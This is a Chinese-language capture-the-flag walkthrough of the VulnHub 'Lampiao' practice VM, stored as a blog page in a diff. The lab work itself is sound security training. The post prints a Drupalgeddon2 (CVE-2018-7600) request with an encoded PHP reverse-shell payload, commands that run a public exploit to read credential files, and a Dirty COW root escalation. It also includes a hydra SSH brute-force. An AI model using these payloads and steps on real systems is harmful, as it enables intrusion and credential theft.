@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title> - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta itemprop="name" content="">
+<meta itemprop="description" content="靶机介绍 这个是一个类OSCP靶机，主要目的getshell、提权获得root权限、最后读取flag 靶机下载地址 https://download.vulnhub.com/lampiao/Lampiao.zip
+靶机运行 这是一个OVF格式的文件，解压zip压缩包，使用VMware或者VirtualBox打开导入即可
+信息收集 首先还是判断靶机地址，使用-sn参数判断当前网段存活主机
+root@kali:~/桌面# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 14:52 CST Nmap scan report for 10.10.10.1 Host is up (0.00025s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00010s latency). MAC Address: 00:50:56:E2:1F:31 (VMware) Nmap scan report for 10.10.10.135 Host is up (0.0036s latency). MAC Address: 00:0C:29:A5:12:B3 (VMware) Nmap scan report for 10.10.10.254 Host is up (0.">
+
+<meta itemprop="wordCount" content="661">
+
+
+
+<meta itemprop="keywords" content="" /><meta property="og:title" content="" />
+<meta property="og:description" content="靶机介绍 这个是一个类OSCP靶机，主要目的getshell、提权获得root权限、最后读取flag 靶机下载地址 https://download.vulnhub.com/lampiao/Lampiao.zip
+靶机运行 这是一个OVF格式的文件，解压zip压缩包，使用VMware或者VirtualBox打开导入即可
+信息收集 首先还是判断靶机地址，使用-sn参数判断当前网段存活主机
+root@kali:~/桌面# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 14:52 CST Nmap scan report for 10.10.10.1 Host is up (0.00025s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00010s latency). MAC Address: 00:50:56:E2:1F:31 (VMware) Nmap scan report for 10.10.10.135 Host is up (0.0036s latency). MAC Address: 00:0C:29:A5:12:B3 (VMware) Nmap scan report for 10.10.10.254 Host is up (0." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vampire-lab.github.io/posts/lampiao/" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="靶机介绍 这个是一个类OSCP靶机，主要目的getshell、提权获得root权限、最后读取flag 靶机下载地址 https://download.vulnhub.com/lampiao/Lampiao.zip
+靶机运行 这是一个OVF格式的文件，解压zip压缩包，使用VMware或者VirtualBox打开导入即可
+信息收集 首先还是判断靶机地址，使用-sn参数判断当前网段存活主机
+root@kali:~/桌面# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 14:52 CST Nmap scan report for 10.10.10.1 Host is up (0.00025s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00010s latency). MAC Address: 00:50:56:E2:1F:31 (VMware) Nmap scan report for 10.10.10.135 Host is up (0.0036s latency). MAC Address: 00:0C:29:A5:12:B3 (VMware) Nmap scan report for 10.10.10.254 Host is up (0."/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />
+
+        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://vampire-lab.github.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://vampire-lab.github.io/">
+				<img src="/images/im/t.png" alt="Vampire blog" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
+	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
+		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+				<div class="matter">
+					<h1 class="title"></h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<h3 id="靶机介绍">靶机介绍</h3>
+<p>这个是一个类OSCP靶机，主要目的getshell、提权获得root权限、最后读取flag
+靶机下载地址
+<code>https://download.vulnhub.com/lampiao/Lampiao.zip</code></p>
+<h3 id="靶机运行">靶机运行</h3>
+<p>这是一个OVF格式的文件，解压zip压缩包，使用VMware或者VirtualBox打开导入即可</p>
+<h3 id="信息收集">信息收集</h3>
+<p>首先还是判断靶机地址，使用-sn参数判断当前网段存活主机</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~/桌面# nmap -sn 10.10.10.*
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 14:52 CST
+Nmap scan report for 10.10.10.1
+Host is up (0.00025s latency).
+MAC Address: 00:50:56:C0:00:08 (VMware)
+Nmap scan report for 10.10.10.2
+Host is up (0.00010s latency).
+MAC Address: 00:50:56:E2:1F:31 (VMware)
+Nmap scan report for 10.10.10.135
+Host is up (0.0036s latency).
+MAC Address: 00:0C:29:A5:12:B3 (VMware)
+Nmap scan report for 10.10.10.254
+Host is up (0.00027s latency).
+MAC Address: 00:50:56:ED:9E:EA (VMware)
+Nmap scan report for 10.10.10.136
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 3.50 seconds
+</code></pre></div><p>探测靶机存在的服务和端口，使用nmap参数<code>-A -p- -sV</code> 获取详细信息，发现开放了22、80、1898端口，其中80和1898为web端口</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~/桌面# nmap -p- -A -sV 10.10.10.135
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 14:53 CST
+Nmap scan report for 10.10.10.135
+Host is up (0.0025s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
+|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
+|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
+|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
+80/tcp   open  http?
+| fingerprint-strings: 
+|   NULL: 
+|     _____ _ _ 
+|     |_|/ ___ ___ __ _ ___ _ _ 
+|     \x20| __/ (_| __ \x20|_| |_ 
+|     ___/ __| |___/ ___|__,_|___/__, ( ) 
+|     |___/ 
+|     ______ _ _ _ 
+|     ___(_) | | | |
+|     \x20/ _` | / _ / _` | | | |/ _` | |
+|_    __,_|__,_|_| |_|
+1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Lampi\xC3\xA3o
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.80%I=7%D=1/2%Time=5E0D9365%P=x86_64-pc-linux-gnu%r(NULL,
+SF:1179,&#34;\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20\(\x2
+SF:0\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x20\x20_
+SF:_\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
+SF:x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x20_`\x
+SF:20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20_\|
+SF:\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\\__\x2
+SF:0\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\\__\|\
+SF:x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\x20\x2
+SF:0\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\|\n\|
+SF:\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_\x20__
+SF:\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_\x20\x
+SF:20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20/\x20_
+SF:`\x20\|\x20\|\x20\|\x20\|\x20&#39;_\x20`\x20_\x20\\\x20/\x20_`\x20\|\x20\x2
+SF:0/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n\|\x20
+SF:\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\x20\|\
+SF:x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\x20\|_
+SF:\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\__,
+SF:_\|_\|\x20\|_\|&#34;);
+MAC Address: 00:0C:29:A5:12:B3 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   2.47 ms 10.10.10.135
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.51 seconds
+
+</code></pre></div><p>访问<code>http://10.10.10.135</code>，经测试未发现有用信息
+<img src="/images/2019/Lampiao/86b3af1bccfea68fbf1e05ac203dd07c.png" alt="86b3af1bccfea68fbf1e05ac203dd07c.png"></p>
+<p>通过nmap结果发现1898上运行这Drupal 7服务，该服务出现过高危漏洞，访问查看一下<code>http://10.10.10.135:1898/</code>
+<img src="/images/2019/Lampiao/2671ef48ca02bc297013a004ad1333a4.png" alt="2671ef48ca02bc297013a004ad1333a4.png"></p>
+<p>使用dirb简单跑一下目录
+<img src="/images/2019/Lampiao/8e8f1f5a3e073580d43d7b68272805f8.png" alt="8e8f1f5a3e073580d43d7b68272805f8.png"></p>
+<p>访问了一下目录，发现信息太多了，尝试访问robots.txt，发现存在很多敏感目录
+<code>http://10.10.10.135:1898/robots.txt</code>
+<img src="/images/2019/Lampiao/f5b1349e24f406cd482a87b38f30d58e.png" alt="f5b1349e24f406cd482a87b38f30d58e.png"></p>
+<p>看到/CHANGELOG.txt文件，访问看看版本信息，发现当前版本为Drupal 7.54，存在<code>CVE-2018-7600</code> 漏洞</p>
+<p><img src="/images/2019/Lampiao/852c32909192d13298e9d1f6d280fc7d.png" alt="852c32909192d13298e9d1f6d280fc7d.png"></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>尝试使用星星最多的项目
+<code>https://github.com/a2u/CVE-2018-7600</code>，经测试未能成功（可能因为是drupal版本问题），使用Metasploit中<code>exploit/unix/webapp/drupal_drupalgeddon2</code> 模块
+<img src="/images/2019/Lampiao/21997dae924e9b49435acc60882424e6.png" alt="21997dae924e9b49435acc60882424e6.png"></p>
+<p>配置目标IP和端口号
+<img src="/images/2019/Lampiao/b98ced18d84b66506ae15defca2f1ff5.png" alt="b98ced18d84b66506ae15defca2f1ff5.png"></p>
+<p>完成后直接执行exploit即可，反弹成功
+<img src="/images/2019/Lampiao/47f05f5d3aba78a52ebcb1e95d0b2c3d.png" alt="47f05f5d3aba78a52ebcb1e95d0b2c3d.png"></p>
+<p>通过抓包发现，Metasploit中发送的payload格式如下，与上面未使用成功的脚本不同</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">POST /?q=user/password&amp;name%5b%23post_render%5d%5b%5d=passthru&amp;name%5b%23markup%5d=php%20-r%20%27eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjEwLjEzNic7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%29%29%3b%27&amp;name%5b%23type%5d=markup HTTP/1.1
+Host: 10.10.10.135:1898
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+form_id=user_pass&amp;_triggering_element_name=name
+</code></pre></div><p>尝试找个可手动利用的脚本，在GitHub上发现<code>https://github.com/pimps/CVE-2018-7600</code> 脚本与抓包内容类似，尝试执行
+使用命令<code>python drupa7-CVE-2018-7600.py -h</code>查看帮助</p>
+<p><img src="/images/2019/Lampiao/b8ae2c0b1205c732cd515bbd9ce47931.png" alt="b8ae2c0b1205c732cd515bbd9ce47931.png"></p>
+<p>使用命令 <code>python drupa7-CVE-2018-7600.py http://10.10.10.135:1898 -c id</code> 获取id，执行成功</p>
+<p><img src="/images/2019/Lampiao/80668562a545ab92fec9ffec408237f4.png" alt="80668562a545ab92fec9ffec408237f4.png"></p>
+<p>drupal的默认配置文件位置为
+<code>/sites/default/settings.php</code>，尝试使用命令<code>python drupa7-CVE-2018-7600.py http://10.10.10.135:1898 -c &quot;cat sites/default/settings.php&quot;</code> 读取内容，搜索password字段，发现mysql密码 <code> 'username' =&gt; 'drupaluser',  'password' =&gt; 'Virgulino'</code>
+<img src="/images/2019/Lampiao/3c4e90b7b4b22fe8a5a379b6ff4461f5.png" alt="3c4e90b7b4b22fe8a5a379b6ff4461f5.png"></p>
+<p>nmap扫描结果我们知道靶机未开放mysql端口，尝试使用密码登陆ssh，知道密码了
+其中音频，提示user tiago
+<code>http://10.10.10.135:1898/audio.m4a</code>
+另一个音频好像没什么用
+<code>http://10.10.10.135:1898/LuizGonzaga-LampiaoFalou.mp3</code></p>
+<p>通过收集信息，我们得到三个用户名<code>drupaluser</code> 、<code>tiago</code>、<code>eder</code>
+既然给了提示，我们就使用<code>tiago</code>和<code>Virgulino</code>尝试登陆
+使用命令 ssh <a href="mailto:tiago@10.10.10.135">tiago@10.10.10.135</a>登陆成功</p>
+<p><img src="/images/2019/Lampiao/737d92a329f45208193fdddc17acc91b.png" alt="737d92a329f45208193fdddc17acc91b.png"></p>
+<h3 id="提权">提权</h3>
+<p>查看一下命令历史记录
+<img src="/images/2019/Lampiao/f5330bb7643862ca7d935ba0a46b62b2.png" alt="f5330bb7643862ca7d935ba0a46b62b2.png"></p>
+<p>使用sudo -l查看当前用户可通过sudo执行的命令，发现。。一个都没有
+<img src="/images/2019/Lampiao/b37d39460c925a1e93b525ed127b76c6.png" alt="b37d39460c925a1e93b525ed127b76c6.png"></p>
+<p>没有找到什么有用的东西，还是看看内核版本，使用exp提权吧
+查看当前版本</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">tiago@lampiao:/opt$ uname -a
+Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
+
+tiago@lampiao:/tmp$ lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 14.04.5 LTS
+Release:        14.04
+Codename:       trusty
+
+</code></pre></div><p>据说这个版本脏牛通杀，还没用过试试
+将脏牛exp拷贝到当前目录
+<code>cp /usr/share/exploitdb/exploits/linux/local/40847.cpp .</code>
+使用<code>python3 -m http.server</code> 搭建服务器</p>
+<p><img src="/images/2019/Lampiao/c3ceddd68640f19af78a3d4e4ea8532f.png" alt="c3ceddd68640f19af78a3d4e4ea8532f.png"></p>
+<p>通过靶机下载exp</p>
+<p><img src="/images/2019/Lampiao/23d298a5fd593acbf79a233d319fc23b.png" alt="23d298a5fd593acbf79a233d319fc23b.png"></p>
+<p>查看exp内容中的使用方法，发现给出了编译命令</p>
+<p><img src="/images/2019/Lampiao/1001fd44c4b85671136b2822776db360.png" alt="1001fd44c4b85671136b2822776db360.png"></p>
+<p>尝试编译，编译成功
+<img src="/images/2019/Lampiao/7c130b46350bcf17afd862f6f0ea8de9.png" alt="7c130b46350bcf17afd862f6f0ea8de9.png"></p>
+<p>提权
+代码中提示 使用<code>dcow -s</code>执行exp
+<img src="/images/2019/Lampiao/a4b63972ac088cccdb49f240c8698981.png" alt="a4b63972ac088cccdb49f240c8698981.png"></p>
+<p>执行，提权成功
+<img src="/images/2019/Lampiao/e1daf9ad9821fe6f8826c2856bff9500.png" alt="e1daf9ad9821fe6f8826c2856bff9500.png"></p>
+<p>拿到flag</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@lampiao:~# cd /root/
+root@lampiao:~# ls
+flag.txt
+root@lampiao:~# cat flag.txt 
+9740616875908d91ddcdaa8aea3af366
+root@lampiao:~# 
+</code></pre></div><p>看了别人的思路，通过页面信息收集，获取到用户名和密码，直接就拿到低权限shell
+使用命令<code>cewl -w dict.txt http://10.10.10.135:1898/?q=node/1</code> 获取页面内的关键字转换为字典</p>
+<p>通过收集页面信息，得到两个用户名<code>tiago</code>、<code>eder</code>
+最后通过用户名和密码字典，爆破ssh账号，获取到密码</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:/opt# hydra -L username.txt -P dict.txt -f -e nsr -t 30 ssh://10.10.10.135
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-02 15:55:31
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 1694 login tries (l:2/p:847), ~57 tries per task
+[DATA] attacking ssh://10.10.10.135:22/
+
+[22][ssh] host: 10.10.10.135   login: tiago   password: Virgulino
+[STATUS] attack finished for 10.10.10.135 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-02 15:55:41
+</code></pre></div>
+			</div>
+
+			<div class="tags">
+				
+					
+				
+			</div>
+
+
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div>1  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
